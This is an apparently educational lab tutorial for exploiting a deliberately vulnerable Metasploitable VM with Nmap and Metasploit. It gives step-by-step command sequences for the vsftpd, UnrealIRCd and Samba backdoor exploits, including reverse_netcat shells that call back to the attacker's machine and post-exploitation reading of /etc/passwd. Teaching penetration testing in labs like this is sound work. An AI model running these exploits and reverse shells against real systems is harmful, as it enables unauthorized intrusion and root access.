Practical Exploitation Using Metasploit

🔧 Lab 1: Service Identification

🤔 WHAT are we doing?

Before we can exploit anything, we need to know what services are running on the target. Nmap will scan the target and tell us which ports are open and what software versions are running.

Target: Metasploitable VM at IP address (usually 192.168.56.102)

📋 Step 1: Run Nmap Version Scan
nmap -sV 192.168.56.102

What the flags mean:

  • -sV → Service version detection (tries to identify exact software and version)
  • 192.168.56.102 → Replace with your Metasploitable IP address
📋 What to Look For

In the output, identify vulnerable services like:

  • vsftpd 2.3.4 on port 21 — has a known backdoor!
  • UnrealIRCd 3.2.8.1 on port 6667 — has a backdoor!
  • Samba 3.0.20 on port 445 — vulnerable to CVE-2007-2447
  • Apache 2.2.8 on port 80 — outdated, many vulnerabilities
# Example Nmap output (what you should see):
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp open http Apache httpd 2.2.8
445/tcp open netbios-ssn Samba smbd 3.X
6667/tcp open irc UnrealIRCd
💡 Pro Tip: If you don't see vsftpd 2.3.4, your Metasploitable might be a different version. Look for other vulnerable services like UnrealIRCd or Samba — the process is the same!

🔧 Labs 2-4: Launch Metasploit & Find Exploit

📋 Lab 2: Launch Metasploit
msfconsole

What happens: The Metasploit Framework Console starts. You'll see an ASCII art banner and the msf6 > prompt. This may take 10-15 seconds to load.

Wait for: msf6 > prompt before typing next commands.

📋 Lab 3: Search for Exploit
search vsftpd

What this does: Searches Metasploit's database for modules related to "vsftpd".

Expected output:

exploit/unix/ftp/vsftpd_234_backdoor
📋 Lab 4: Select Exploit
use exploit/unix/ftp/vsftpd_234_backdoor

What this does: Loads the selected exploit module. Your prompt will change to show the module is active.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

Alternative: If vsftpd isn't found, try search unreal for the UnrealIRCd exploit.

✅ After these steps: You should have loaded the exploit module and be ready to configure it.

🔧 Labs 5-6: Configure Target & Run Exploit

🤔 WHY do we need to configure?

Every exploit needs to know the target's IP address (RHOST). Some exploits also need your IP (LHOST) for reverse shells. The show options command shows what needs to be set.

📋 Lab 5: Configure Target
show options
# See what needs to be configured
set RHOST 192.168.56.102
# Replace with your Metasploitable IP

What is RHOST? Remote HOST — the target machine's IP address.

What is LHOST? Local HOST — YOUR Kali machine's IP (needed for reverse shells).

📋 Lab 6: Run Exploit
run
# Or type 'exploit'

What happens: Metasploit sends the exploit payload to the target. If successful, the backdoor triggers and you get a shell.

Expected output: Messages about sending exploit, then a command prompt appears.

# Full example workflow:
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > set RHOST 192.168.56.102
msf6 exploit(...) > set PAYLOAD cmd/unix/interact
msf6 exploit(...) > run
# If successful, you'll see:
[*] Command shell session 1 opened
whoami
root
⚠️ Troubleshooting: If the exploit fails, try these alternatives:
  • Try set PAYLOAD cmd/unix/reverse_netcat instead
  • Check your IP: ifconfig or ip a on Kali
  • Verify Metasploitable is running and reachable: ping 192.168.56.102

✅ Expected Result & Lab 7: Interact with System

🤔 WHAT happens when exploitation succeeds?

You should see a command shell prompt. This means you have remote access to the target system. You can now run commands as if you were sitting at the target machine.

🎯 Expected Result
  • Command shell is opened — you see a prompt like # or $
  • Access to target system — you can run commands
  • Depending on the exploit, you may have ROOT access!
# What success looks like:
[*] Command shell session 1 opened
#
📋 Lab 7: Explore the Target

Once you have a shell, try these commands:

whoami # What user are you? (root? user?)
pwd # Current directory path
ls -la # List files in current directory
id # User ID and group information
cat /etc/passwd # View user accounts
✅ You have successfully exploited a vulnerable service!

You went from: Unknown target → Reconnaissance → Exploit selection → Configuration → Remote shell access.

This is the same workflow professional penetration testers use (with proper authorization).

📌 To exit the shell: Type exit or Ctrl+C
To exit Metasploit: Type exit again or quit

🔄 Alternative: Exploiting UnrealIRCd (Backdoor)

If vsftpd wasn't available or you want to practice another exploit, try the UnrealIRCd backdoor.

📋 Step-by-Step (UnrealIRCd)
# In Metasploit:
search unreal
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 192.168.56.102
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <your-kali-ip>
run
📋 Alternative: Samba Exploit
# For Samba usermap exploit:
search samba usermap
use exploit/multi/samba/usermap_script
set RHOST 192.168.56.102
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <your-kali-ip>
run
💡 Understanding Reverse Shell Payloads:

When using reverse_netcat, the target connects BACK to your machine. You need to set LHOST to your Kali IP address. Metasploit automatically listens for the incoming connection.

# Find your Kali IP address:
ip a | grep inet
# Look for 192.168.56.x (your Host-Only network IP)
